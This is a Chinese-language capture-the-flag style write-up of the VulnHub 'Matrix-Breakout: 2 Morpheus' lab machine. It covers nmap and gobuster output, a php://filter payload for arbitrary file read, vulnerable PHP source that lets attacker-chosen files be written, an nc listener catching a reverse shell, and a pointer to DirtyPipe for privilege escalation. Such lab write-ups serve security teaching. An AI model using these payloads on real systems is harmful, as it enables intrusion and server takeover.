---
title: VulnHub Matrix-Breakout：2 Morpheus
date: 2026-06-08 16:06:00
categories: 
  - VulnHub
tags:
  - 任意文件读取
  - RCE
  - DirtyPipe（CVE-2022-0847）
---

# Matrix-Breakout：2 Morpheus

博客原地址：https://www.cnblogs.com/hirak0/articles/18105800（靶机没部署起来）

项目地址：https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

```bash
┌──(root㉿MYsec)-[/home/hirak0]
└─# nmap -A -sV -T4 -p- 192.168.11.128
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-24 18:22 CST
Nmap scan report for 192.168.11.128
Host is up (0.00041s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Morpheus:1
81/tcp open  http    nginx 1.18.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Meeting Place
|_http-title: 401 Authorization Required
|_http-server-header: nginx/1.18.0
MAC Address: 00:0C:29:5A:0D:D1 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/24%OT=22%CT=1%CU=43746%PV=Y%DS=1%DC=D%G=Y%M=000C2
OS:9%TM=65FFFF15%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10F%TI=Z%CI=Z%I
OS:I=I%TS=A)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW
OS:6%O5=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88
OS:%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.11.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.81 seconds
```

## 任意文件读取

### file

扫描后台目录

```bash
┌──(root㉿MYsec)-[/home/hirak0]
└─# gobuster dir -u http://192.168.11.128 -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.11.128
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,bak,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 348]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.11.128/javascript/]
/robots.txt           (Status: 200) [Size: 47]
/graffiti.txt         (Status: 200) [Size: 139]
/graffiti.php         (Status: 200) [Size: 451]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

访问过去

![](https://pic1.imgdb.cn/item/6a26819b3c9809430d3578d3.png)

![](https://pic1.imgdb.cn/item/6a2681ae3c9809430d3578df.png)

抓包发现有隐藏参数，推测任意文件读取漏洞

![](https://pic1.imgdb.cn/item/6a2681be3c9809430d3578e2.png)

利用 PHP 伪协议读取一下 `graffiti.php` 的内容

```php
php://filter/read=convert.base64-encode/resource=graffiti.php
```

![](https://pic1.imgdb.cn/item/6a2682383c9809430d357937.png)

## RCE

### message

```php
<?php

// 默认保存涂鸦的文件名
$file = "graffiti.txt";

// 如果是 POST 请求（即用户提交了表单）
if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    // 如果用户指定了文件名，则使用用户指定的文件
    if (isset($_POST['file'])) {
        $file = $_POST['file'];
    }

    // 如果用户提交了留言内容
    if (isset($_POST['message'])) {
        // 以追加模式打开文件（不存在则创建）
        $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file);
        // 将留言写入文件
        fwrite($handle, $_POST['message']);
        // 写入换行符，使每条留言独占一行
        fwrite($handle, "\n");
        // 关闭文件
        fclose($handle);
    }
}

// 以只读模式打开文件
$handle = fopen($file, "r");
// 逐行读取文件，直到文件末尾
while (!feof($handle)) {
    echo fgets($handle);      // 输出当前行内容
    echo "<br>\n";            // 添加 HTML 换行标签
}
// 关闭文件
fclose($handle);
?>
```

由于两个参数都是由用户可控，所以我们可以直接写入反弹 Shell

![](https://pic1.imgdb.cn/item/6a2683703c9809430d3579d4.png)

```bash
┌──(root㉿MYsec)-[/home/hirak0]
└─# nc -lvvp 6666
listening on [any] 6666 ...
192.168.11.128: inverse host lookup failed: Unknown host
connect to [192.168.11.129] from (UNKNOWN) [192.168.11.128] 48312
bash: cannot set terminal process group (826): Inappropriate ioctl for device
bash: no job control in this shell
www-data@morpheus:/var/www/html$ 

www-data@morpheus:/var/www/html$ 

www-data@morpheus:/var/www/html$ whoami
whoami
www-data
www-data@morpheus:/var/www/html$ 
```

## 提权

### DirtyPipe（CVE-2022-0847）

![](https://pic1.imgdb.cn/item/6a2684833c9809430d35b35a.png)